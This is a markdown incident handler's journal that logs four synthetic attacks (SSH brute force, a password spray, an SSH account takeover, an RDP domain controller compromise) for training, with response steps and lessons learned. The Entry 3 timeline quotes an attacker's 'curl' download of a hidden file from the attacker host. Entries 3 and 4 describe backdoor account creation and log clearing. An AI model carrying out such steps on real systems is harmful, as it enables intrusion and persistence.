# Incident Handler's Journal

Structured journal entries produced while working the sample dataset in this project. Each entry follows the **5 W's** format (Who, What, When, Where, Why) plus the tools used and the handler's notes, the same format used in professional SOC shift notes.

> All data is synthetic. IPs come from the RFC 5737 documentation ranges (`198.51.100.0/24`, `203.0.113.0/24`) and hostnames are fictitious.

---

## Entry 1 — SSH brute force against `web01`

| | |
|---|---|
| **Date** | 2026-10-28 |
| **Entry #** | 1 |
| **Ticket** | INC-2026-1028-01 |
| **Tool(s) used** | `triage.py` (rule IR-001), `grep`, `sha256sum` |
| **Who** | External source `203.0.113.45` |
| **What** | 40 failed SSH password attempts against `root` (30) and the non-existent account `admin` (10) in ~6 minutes |
| **When** | 02:10:00 – 02:15:51 |
| **Where** | `web01` (Linux, internet-facing) |
| **Why** | Automated credential guessing (MITRE ATT&CK **T1110.001**). No successful logon from this IP. |

**Additional notes.** The `Invalid user` + `Failed password for invalid user` line pair represents one attempt; the parser counts only the `Failed` line to avoid inflating the total. Root SSH login should be disabled (`PermitRootLogin no`) and password authentication turned off in favor of keys + MFA. Source blocked at the perimeter. Severity: **High** (privileged account targeted) but no compromise.

---

## Entry 2 — Password spray from `198.51.100.23`

| | |
|---|---|
| **Date** | 2026-10-28 |
| **Entry #** | 2 |
| **Ticket** | INC-2026-1028-02 |
| **Tool(s) used** | `triage.py` (rule IR-002) |
| **Who** | External source `198.51.100.23` |
| **What** | One failed attempt each against 7 different accounts (`jdoe`, `asmith`, `mlee`, `backup`, `svc_web`, `oracle`, `deploy`) |
| **When** | 03:00 – 03:12 |
| **Where** | `web01` |
| **Why** | Low-and-slow spraying designed to stay below per-account lockout thresholds (**T1110.003**). |

**Additional notes.** Per-account lockout would *not* have caught this — the per-source, many-accounts view is what surfaces it. The targeted list contains real usernames, which suggests prior reconnaissance (OSINT or an earlier leak). Recommend a breached-password screening check for all targeted accounts per NIST SP 800-63B-4.

---

## Entry 3 — Account compromise and persistence on `web01` (CRITICAL)

| | |
|---|---|
| **Date** | 2026-10-28 |
| **Entry #** | 3 |
| **Ticket** | INC-2026-1028-03 (declared incident) |
| **Tool(s) used** | `triage.py` (IR-003, IR-004, IR-005, IR-006), manual log review |
| **Who** | External source `203.0.113.77` using the `deploy` account |
| **What** | 5 failed passwords, then a **successful** password logon. Within 6 minutes the actor ran `sudo curl` to download a hidden file `/tmp/.x` from the attacker IP, created a new user `sysupdate`, and added it to the `sudo` group. |
| **When** | 02:47:00 – 02:53:10 |
| **Where** | `web01` |
| **Why** | Weak/guessed password on a shared deployment account (**T1110 → T1078**), followed by tool transfer (**T1105**), local account creation (**T1136.001**) and privilege persistence (**T1098**). |

**Timeline**

| Time | Event |
|---|---|
| 02:47:00 – 02:48:20 | 5× `Failed password for deploy` |
| 02:50:00 | `Accepted password for deploy from 203.0.113.77` |
| 02:52:00 | `sudo ... COMMAND=/usr/bin/curl -o /tmp/.x http://203.0.113.77/x` |
| 02:53:00 | `useradd` → `sysupdate` (UID 1005) |
| 02:53:10 | `usermod` → `sysupdate` added to `sudo` |

**Actions taken (per PB-IR-001)**: host isolated via EDR; memory image captured; `deploy` and `sysupdate` disabled; `/tmp/.x` collected and hashed for analysis; `203.0.113.77` blocked and hunted estate-wide. **Root cause:** a password-authenticated service account with `sudo` rights exposed to the internet. **Fix:** key-only SSH, no shared accounts, `sudo` scoped to specific commands, SSH reachable only through a bastion.

---

## Entry 4 — RDP compromise of Domain Controller `DC01` (CRITICAL)

| | |
|---|---|
| **Date** | 2026-10-28 |
| **Entry #** | 4 |
| **Ticket** | INC-2026-1028-04 (merged with 03 under one incident commander) |
| **Tool(s) used** | `export_windows_events.ps1`, `triage.py` (IR-001, IR-003, IR-005, IR-006, IR-007) |
| **Who** | External source `198.51.100.200` using the built-in `Administrator` account |
| **What** | 25 failed RDP logons (4625, LogonType 10), then success (4624) with special privileges (4672). Actor created `helpdesk_tmp` (4720), added it to **Domain Admins** (4728), then **cleared the Security log** (1102). |
| **When** | 06:30:00 – 06:45:00 |
| **Where** | `DC01.corp.example` |
| **Why** | RDP exposed to the internet on a domain controller with a guessable built-in admin password. The log clear (**T1070.001**) indicates deliberate anti-forensics. |

**Additional notes.** This is the highest-impact event in the dataset: full domain compromise must be assumed. Recovery requires resetting the `krbtgt` account password **twice**, rotating all privileged credentials, and reviewing GPOs for malicious changes. Because the local log was cleared, the forwarded SIEM copy is the authoritative record — this is exactly why log forwarding is a Preparation item in the playbook.

---

## Reflection / lessons learned

1. **Correlation beats single events.** A single 4625 is noise; 25 followed by a 4624 from the same IP is an incident.
2. **Exposure was the root cause in both compromises**: SSH password auth and internet-facing RDP. Detection worked, but prevention (bastion/ZTNA + phishing-resistant MFA) would have stopped both.
3. **Hash evidence first.** The report records SHA-256 of every input so findings can be defended later.
4. **Tune for the environment.** Thresholds, business hours and service accounts are config-driven so the same tool works for a 50-user nonprofit or a 5,000-endpoint enterprise.
